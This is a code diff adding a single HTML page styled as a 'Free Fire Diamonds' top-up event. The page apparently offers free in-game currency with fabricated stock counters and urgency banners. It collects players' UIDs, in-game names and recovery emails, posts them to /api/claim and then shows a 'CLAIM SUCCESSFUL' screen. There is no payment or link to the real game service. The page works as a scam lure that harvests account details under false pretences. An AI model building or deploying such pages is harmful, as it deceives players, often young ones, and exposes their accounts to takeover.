@@ -1,0 +1,645 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>FF Diamond Top-Up</title>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;700;900&family=Rajdhani:wght@300;400;500;600;700&family=Noto+Sans+JP:wght@300;400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        :root {
+            --gold: #FFD700;
+            --gold2: #FFA500;
+            --cyan: #00f5ff;
+            --pink: #ff2d78;
+            --purple: #b044ff;
+            --glass: rgba(255,255,255,0.06);
+            --glass-border: rgba(255,255,255,0.15);
+            --dark: #05030f;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Rajdhani', sans-serif;
+            background: var(--dark);
+            min-height: 100vh;
+            overflow-x: hidden;
+            color: #fff;
+        }
+
+        .bg-layer {
+            position: fixed; inset: 0; z-index: 0;
+            background:
+                radial-gradient(ellipse 80% 60% at 20% 10%, rgba(176,68,255,0.22) 0%, transparent 60%),
+                radial-gradient(ellipse 60% 50% at 80% 80%, rgba(0,245,255,0.15) 0%, transparent 55%),
+                radial-gradient(ellipse 50% 40% at 50% 50%, rgba(255,45,120,0.10) 0%, transparent 60%),
+                linear-gradient(160deg, #05030f 0%, #0d0520 40%, #070b1f 100%);
+        }
+
+        .hero-img-wrap {
+            position: fixed;
+            right: -60px;
+            bottom: 0;
+            width: 420px;
+            height: 100vh;
+            z-index: 1;
+            pointer-events: none;
+        }
+        .hero-img-wrap img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            object-position: top center;
+            mask-image: linear-gradient(to left, rgba(0,0,0,0.9) 30%, rgba(0,0,0,0.3) 70%, transparent 100%);
+            -webkit-mask-image: linear-gradient(to left, rgba(0,0,0,0.9) 30%, rgba(0,0,0,0.3) 70%, transparent 100%);
+            filter: saturate(1.3) contrast(1.05);
+            mix-blend-mode: luminosity;
+            opacity: 0.55;
+        }
+        .hero-img-glow {
+            position: absolute;
+            right: 0; bottom: 0;
+            width: 100%; height: 100%;
+            background: radial-gradient(ellipse 60% 70% at 60% 60%, rgba(176,68,255,0.25), transparent 70%);
+        }
+
+        .grid-overlay {
+            position: fixed; inset: 0; z-index: 1; pointer-events: none;
+            background-image:
+                linear-gradient(rgba(0,245,255,0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0,245,255,0.03) 1px, transparent 1px);
+            background-size: 50px 50px;
+        }
+
+        canvas#particles { position: fixed; inset: 0; z-index: 1; pointer-events: none; }
+        .scanline {
+            position: fixed; inset: 0; z-index: 2; pointer-events: none;
+            background: repeating-linear-gradient(0deg, transparent, transparent 3px, rgba(0,0,0,0.03) 3px, rgba(0,0,0,0.03) 4px);
+        }
+
+        .page {
+            position: relative; z-index: 3;
+            max-width: 520px;
+            min-height: 100vh;
+            padding: 30px 22px 60px;
+            margin: 0 auto;
+        }
+
+        /* Header with Dashboard Button */
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            margin-bottom: 28px;
+        }
+        .dashboard-link {
+            background: rgba(255,215,0,0.15);
+            border: 1px solid rgba(255,215,0,0.4);
+            padding: 10px 18px;
+            border-radius: 40px;
+            text-decoration: none;
+            color: #FFD700;
+            font-size: 12px;
+            font-family: 'Orbitron', monospace;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .dashboard-link:hover {
+            background: rgba(255,215,0,0.3);
+            transform: translateY(-2px);
+        }
+        .header-badge {
+            display: inline-flex; align-items: center; gap: 6px;
+            background: rgba(255,45,120,0.15);
+            border: 1px solid rgba(255,45,120,0.5);
+            border-radius: 40px;
+            padding: 4px 14px;
+            font-family: 'Orbitron', monospace;
+            font-size: 9px;
+            letter-spacing: 3px;
+            color: var(--pink);
+            margin-bottom: 14px;
+            animation: badgePulse 3s ease-in-out infinite;
+        }
+        @keyframes badgePulse {
+            0%,100% { box-shadow: 0 0 0 0 rgba(255,45,120,0.3); }
+            50% { box-shadow: 0 0 20px 4px rgba(255,45,120,0.2); }
+        }
+        .header-title {
+            font-family: 'Orbitron', monospace;
+            font-size: 34px;
+            font-weight: 900;
+            line-height: 1;
+            letter-spacing: -1px;
+        }
+        .header-title .line1 {
+            background: linear-gradient(90deg, #fff 0%, rgba(255,255,255,0.7) 100%);
+            -webkit-background-clip: text; background-clip: text; color: transparent;
+        }
+        .header-title .line2 {
+            background: linear-gradient(90deg, var(--gold) 0%, var(--gold2) 50%, var(--pink) 100%);
+            -webkit-background-clip: text; background-clip: text; color: transparent;
+        }
+        .header-sub {
+            font-family: 'Noto Sans JP', sans-serif;
+            font-size: 11px;
+            opacity: 0.45;
+            letter-spacing: 3px;
+            margin-top: 6px;
+            color: var(--cyan);
+        }
+
+        .notice-bar {
+            background: linear-gradient(90deg, rgba(255,215,0,0.08), rgba(255,45,120,0.08));
+            border: 1px solid rgba(255,215,0,0.2);
+            border-radius: 12px;
+            padding: 10px 16px;
+            display: flex; align-items: center; gap: 10px;
+            margin-bottom: 24px;
+            font-size: 13px;
+            font-weight: 600;
+        }
+        .notice-dot {
+            width: 8px; height: 8px; border-radius: 50%;
+            background: var(--gold);
+            animation: blink 1.2s infinite;
+        }
+        @keyframes blink { 0%,100%{opacity:1;} 50%{opacity:0.2;} }
+
+        .section-label {
+            font-family: 'Orbitron', monospace;
+            font-size: 10px;
+            letter-spacing: 4px;
+            color: var(--cyan);
+            opacity: 0.7;
+            margin-bottom: 14px;
+        }
+
+        .packs-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin-bottom: 28px;
+        }
+
+        .pack-card {
+            background: var(--glass);
+            border: 1px solid var(--glass-border);
+            border-radius: 18px;
+            padding: 16px 10px 14px;
+            text-align: center;
+            cursor: pointer;
+            position: relative;
+            transition: all 0.25s ease;
+            backdrop-filter: blur(14px);
+        }
+        .pack-card:hover {
+            transform: translateY(-3px);
+            border-color: rgba(255,215,0,0.4);
+        }
+        .pack-card.selected {
+            border-color: var(--gold);
+            background: rgba(255,215,0,0.12);
+            box-shadow: 0 0 25px rgba(255,215,0,0.2);
+            transform: translateY(-2px) scale(1.02);
+        }
+        .pack-tag {
+            position: absolute; top: -1px; left: 50%; transform: translateX(-50%);
+            background: linear-gradient(90deg, var(--purple), var(--pink));
+            font-family: 'Orbitron', monospace;
+            font-size: 7px;
+            padding: 3px 10px;
+            border-radius: 0 0 8px 8px;
+            white-space: nowrap;
+        }
+        .pack-gem { font-size: 28px; margin-bottom: 6px; display: block; }
+        .pack-amt {
+            font-family: 'Orbitron', monospace;
+            font-size: 18px;
+            font-weight: 700;
+            color: var(--gold);
+        }
+        .pack-label { font-size: 9px; opacity: 0.5; margin-top: 3px; }
+        .pack-stock { font-size: 10px; color: var(--pink); margin-top: 6px; }
+
+        .form-glass {
+            background: var(--glass);
+            border: 1px solid var(--glass-border);
+            border-radius: 24px;
+            padding: 26px 22px;
+            backdrop-filter: blur(20px);
+            position: relative;
+        }
+        .form-title {
+            font-family: 'Orbitron', monospace;
+            font-size: 13px;
+            letter-spacing: 2px;
+            margin-bottom: 22px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .form-title::after {
+            content: ''; flex: 1; height: 1px;
+            background: linear-gradient(90deg, rgba(255,215,0,0.3), transparent);
+        }
+        .field-wrap { margin-bottom: 16px; }
+        .field-label {
+            font-size: 10px;
+            letter-spacing: 2px;
+            color: var(--cyan);
+            margin-bottom: 7px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        .field-input {
+            width: 100%;
+            padding: 13px 16px;
+            background: rgba(255,255,255,0.05);
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 12px;
+            color: #fff;
+            font-family: 'Rajdhani', sans-serif;
+            font-size: 15px;
+        }
+        .field-input:focus {
+            outline: none;
+            border-color: var(--gold);
+            background: rgba(255,215,0,0.06);
+        }
+        .server-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 8px;
+        }
+        .server-btn {
+            padding: 11px;
+            background: rgba(255,255,255,0.04);
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 10px;
+            color: rgba(255,255,255,0.6);
+            cursor: pointer;
+            text-align: center;
+        }
+        .server-btn.active {
+            border-color: var(--cyan);
+            color: var(--cyan);
+            background: rgba(0,245,255,0.08);
+        }
+        .selected-preview {
+            display: none;
+            background: linear-gradient(135deg, rgba(255,215,0,0.08), rgba(255,45,120,0.05));
+            border: 1px solid rgba(255,215,0,0.25);
+            border-radius: 14px;
+            padding: 14px 18px;
+            margin-bottom: 18px;
+            align-items: center;
+            justify-content: space-between;
+        }
+        .selected-preview.show { display: flex; }
+        .sp-value {
+            font-family: 'Orbitron', monospace;
+            font-size: 20px;
+            color: var(--gold);
+            font-weight: 700;
+        }
+        .submit-btn {
+            width: 100%;
+            padding: 17px;
+            background: linear-gradient(135deg, var(--gold) 0%, var(--gold2) 50%, var(--pink) 100%);
+            border: none;
+            border-radius: 14px;
+            font-family: 'Orbitron', monospace;
+            font-size: 13px;
+            font-weight: 700;
+            color: #0a0510;
+            cursor: pointer;
+            margin-top: 8px;
+        }
+        .submit-btn:disabled { opacity: 0.6; cursor: not-allowed; }
+        .toast {
+            position: fixed;
+            bottom: 30px; left: 50%;
+            transform: translateX(-50%) translateY(20px);
+            background: rgba(5,3,15,0.95);
+            border: 1px solid rgba(255,215,0,0.3);
+            padding: 12px 28px;
+            border-radius: 40px;
+            font-size: 14px;
+            z-index: 9999;
+            opacity: 0;
+            transition: all 0.3s;
+            white-space: nowrap;
+        }
+        .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
+        .toast.success { border-color: rgba(0,245,255,0.4); color: var(--cyan); }
+        .toast.error { border-color: rgba(255,45,120,0.4); color: var(--pink); }
+        .success-overlay {
+            display: none;
+            position: fixed; inset: 0; z-index: 999;
+            background: rgba(5,3,15,0.92);
+            backdrop-filter: blur(20px);
+            align-items: center; justify-content: center;
+            flex-direction: column;
+            text-align: center;
+        }
+        .success-overlay.show { display: flex; }
+        .success-icon { font-size: 80px; margin-bottom: 20px; animation: bounceIn 0.6s; }
+        @keyframes bounceIn {
+            0% { transform: scale(0); opacity: 0; }
+            60% { transform: scale(1.2); }
+            100% { transform: scale(1); opacity: 1; }
+        }
+        .success-title {
+            font-family: 'Orbitron', monospace;
+            font-size: 22px;
+            background: linear-gradient(90deg, var(--gold), var(--pink));
+            -webkit-background-clip: text; background-clip: text; color: transparent;
+        }
+        @media (max-width: 400px) {
+            .packs-grid { grid-template-columns: repeat(2, 1fr); }
+            .header-title { font-size: 28px; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="bg-layer"></div>
+<div class="grid-overlay"></div>
+<canvas id="particles"></canvas>
+<div class="scanline"></div>
+
+<div class="hero-img-wrap">
+    <img src="https://i.ibb.co/6ccmkzNN/photo-2026-03-23-18-47-47.jpg" alt="FF Character">
+    <div class="hero-img-glow"></div>
+</div>
+
+<div class="page">
+
+    <!-- Header with Dashboard Button -->
+    <div class="header">
+        <div>
+            <div class="header-badge">
+                <span>●</span> LIVE EVENT
+            </div>
+            <div class="header-title">
+                <div class="line1">FREE FIRE</div>
+                <div class="line2">DIAMONDS</div>
+            </div>
+            <div class="header-sub">ダイヤモンド補充 · TOP-UP CENTER</div>
+        </div>
+        <a href="/user-dashboard" class="dashboard-link">
+            <i class="fas fa-user-circle"></i> MY DASHBOARD
+        </a>
+    </div>
+
+    <div class="notice-bar">
+        <div class="notice-dot"></div>
+        <span>🔥 LIMITED PACKS AVAILABLE · GRAB NOW 🔥</span>
+    </div>
+
+    <div class="section-label">✦ SELECT YOUR DIAMOND PACK ✦</div>
+    <div class="packs-grid" id="packGrid"></div>
+
+    <div class="form-glass">
+        <div class="form-title">
+            <span style="color:var(--gold)">◆</span> PLAYER INFORMATION
+        </div>
+
+        <div class="selected-preview" id="selectedPreview">
+            <div>
+                <div class="sp-label">SELECTED PACK</div>
+                <div class="sp-value" id="previewAmt">—</div>
+            </div>
+            <div class="sp-icon" id="previewIcon">💎</div>
+        </div>
+
+        <form id="topupForm">
+            <div class="field-wrap">
+                <div class="field-label">🎮 USER ID (UID) *</div>
+                <input class="field-input" id="uid" type="text" placeholder="Enter your 8-12 digit UID" required>
+            </div>
+            <div class="field-wrap">
+                <div class="field-label">👤 IN-GAME NAME *</div>
+                <input class="field-input" id="gameName" type="text" placeholder="Your Free Fire name" required>
+            </div>
+            <div class="field-wrap">
+                <div class="field-label">📧 RECOVERY EMAIL *</div>
+                <input class="field-input" id="phone" type="email" placeholder="your@email.com" required>
+            </div>
+            <div class="field-wrap">
+                <div class="field-label">🌐 SELECT SERVER</div>
+                <div class="server-grid" id="serverGrid">
+                    <div class="server-btn active" data-server="IND">🇮🇳 INDIA</div>
+                    <div class="server-btn" data-server="SG">🇸🇬 SINGAPORE</div>
+                    <div class="server-btn" data-server="BR">🇧🇷 BRAZIL</div>
+                    <div class="server-btn" data-server="ME">🌍 MIDDLE EAST</div>
+                </div>
+            </div>
+            <button type="submit" class="submit-btn" id="submitBtn">
+                💎 CONFIRM & CLAIM 💎
+            </button>
+        </form>
+    </div>
+</div>
+
+<div class="toast" id="toast"></div>
+<div class="success-overlay" id="successOverlay">
+    <div class="success-icon">💎</div>
+    <div class="success-title">CLAIM SUCCESSFUL!</div>
+    <div class="success-sub" style="margin-top: 15px;">Redirecting to your dashboard in 3 seconds...</div>
+</div>
+
+<script>
+// ========== COMPLETE SCRIPT WITH 3 SECOND REDIRECT ==========
+
+let selectedPack = null;
+
+// Diamond packs data
+const packs = [
+    { id:1, amount:100,  icon:'💎',       stock:48,  tag: null,   color:'cyan' },
+    { id:2, amount:310,  icon:'💎💎',      stock:35,  tag: null,   color:'gold' },
+    { id:3, amount:520,  icon:'💎💎💎',    stock:28,  tag: 'POPULAR', color:'purple' },
+    { id:4, amount:1060, icon:'🔷💎🔷',   stock:18,  tag: null,   color:'gold' },
+    { id:5, amount:2180, icon:'👑💎',      stock:12,  tag: 'HOT',  color:'pink' },
+    { id:6, amount:5600, icon:'🔥👑💎',   stock:5,   tag: 'ELITE', color:'purple' }
+];
+
+// Render packs
+function renderPacks() {
+    const grid = document.getElementById('packGrid');
+    if (!grid) return;
+    grid.innerHTML = packs.map(p => `
+        <div class="pack-card ${p.tag ? 'popular' : ''}" data-id="${p.id}" onclick="selectPack(${p.id})">
+            ${p.tag ? `<div class="pack-tag">${p.tag}</div>` : ''}
+            <span class="pack-gem">${p.icon}</span>
+            <div class="pack-amt">${p.amount.toLocaleString()}</div>
+            <div class="pack-label">DIAMONDS</div>
+            <div class="pack-stock">⚡ ${p.stock} left</div>
+        </div>
+    `).join('');
+}
+
+// Select pack function
+window.selectPack = function(id) {
+    selectedPack = packs.find(p => p.id === id);
+    document.querySelectorAll('.pack-card').forEach(c => c.classList.remove('selected'));
+    document.querySelector(`[data-id="${id}"]`).classList.add('selected');
+    const preview = document.getElementById('selectedPreview');
+    document.getElementById('previewAmt').textContent = selectedPack.amount.toLocaleString() + ' 💠';
+    document.getElementById('previewIcon').textContent = selectedPack.icon;
+    preview.classList.add('show');
+};
+
+// Server selection
+const serverGrid = document.getElementById('serverGrid');
+if (serverGrid) {
+    serverGrid.addEventListener('click', (e) => {
+        const btn = e.target.closest('.server-btn');
+        if (!btn) return;
+        document.querySelectorAll('.server-btn').forEach(b => b.classList.remove('active'));
+        btn.classList.add('active');
+    });
+}
+
+// Form submit - WITH 3 SECOND REDIRECT
+const form = document.getElementById('topupForm');
+form.addEventListener('submit', async (e) => {
+    e.preventDefault();
+    
+    if (!selectedPack) {
+        showToast('💎 Please select a diamond pack first!', 'error');
+        return;
+    }
+
+    const uid = document.getElementById('uid').value.trim();
+    const gameName = document.getElementById('gameName').value.trim();
+    const recoveryEmail = document.getElementById('phone').value.trim();
+    const server = document.querySelector('.server-btn.active')?.dataset.server || 'IND';
+
+    if (!uid || !gameName || !recoveryEmail) {
+        showToast('❌ Please fill all fields!', 'error');
+        return;
+    }
+
+    // UID validation (8-12 digits)
+    if (!/^\d{8,12}$/.test(uid)) {
+        showToast('❌ Invalid UID! Must be 8-12 digits.', 'error');
+        return;
+    }
+
+    // Email validation
+    if (!/^\S+@\S+\.\S+$/.test(recoveryEmail)) {
+        showToast('❌ Invalid email format!', 'error');
+        return;
+    }
+
+    const btn = document.getElementById('submitBtn');
+    const originalText = btn.textContent;
+    btn.textContent = '⚡ PROCESSING...';
+    btn.disabled = true;
+
+    try {
+        const res = await fetch('/api/claim', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                uid: uid,
+                gameName: gameName,
+                recoveryEmail: recoveryEmail,
+                server: server,
+                diamondAmount: selectedPack.amount,
+                diamondIcon: selectedPack.icon
+            })
+        });
+
+        const data = await res.json();
+        console.log('Response:', data);
+
+        if (data.success) {
+            const successOverlay = document.getElementById('successOverlay');
+            successOverlay.classList.add('show');
+            showToast(data.message, 'success');
+            
+            // 🔥 REDIRECT TO USER DASHBOARD AFTER 3 SECONDS
+            setTimeout(() => {
+                window.location.href = '/user-dashboard';
+            }, 3000);
+            
+        } else {
+            showToast(data.message, 'error');
+            btn.textContent = originalText;
+            btn.disabled = false;
+        }
+    } catch (error) {
+        console.error('Error:', error);
+        showToast('🌐 Network error! Check your connection.', 'error');
+        btn.textContent = originalText;
+        btn.disabled = false;
+    }
+});
+
+// Toast function
+function showToast(msg, type = '') {
+    const t = document.getElementById('toast');
+    t.textContent = msg;
+    t.className = `toast show ${type}`;
+    setTimeout(() => { t.className = 'toast'; }, 3000);
+}
+
+// Particles canvas
+(function() {
+    const canvas = document.getElementById('particles');
+    if (!canvas) return;
+    const ctx = canvas.getContext('2d');
+    let W, H, pts = [];
+
+    function resize() {
+        W = canvas.width = window.innerWidth;
+        H = canvas.height = window.innerHeight;
+    }
+    resize();
+    window.addEventListener('resize', resize);
+
+    const colors = ['rgba(255,215,0,', 'rgba(0,245,255,', 'rgba(176,68,255,', 'rgba(255,45,120,'];
+
+    for (let i = 0; i < 60; i++) {
+        pts.push({
+            x: Math.random() * 2000,
+            y: Math.random() * 1200,
+            r: Math.random() * 2 + 0.5,
+            vx: (Math.random() - 0.5) * 0.3,
+            vy: -Math.random() * 0.5 - 0.1,
+            color: colors[Math.floor(Math.random() * colors.length)],
+            a: Math.random() * 0.5 + 0.2
+        });
+    }
+
+    function draw() {
+        ctx.clearRect(0, 0, W, H);
+        pts.forEach(p => {
+            p.x += p.vx;
+            p.y += p.vy;
+            if (p.y < -10) { p.y = H + 10; p.x = Math.random() * W; }
+            if (p.x < -10) p.x = W + 10;
+            if (p.x > W + 10) p.x = -10;
+            ctx.beginPath();
+            ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
+            ctx.fillStyle = p.color + p.a + ')';
+            ctx.fill();
+        });
+        requestAnimationFrame(draw);
+    }
+    draw();
+})();
+
+// Initialize
+renderPacks();
+console.log('✅ FF Diamond System Ready - 3 second redirect to dashboard');
+</script>
+</body>
+</html>
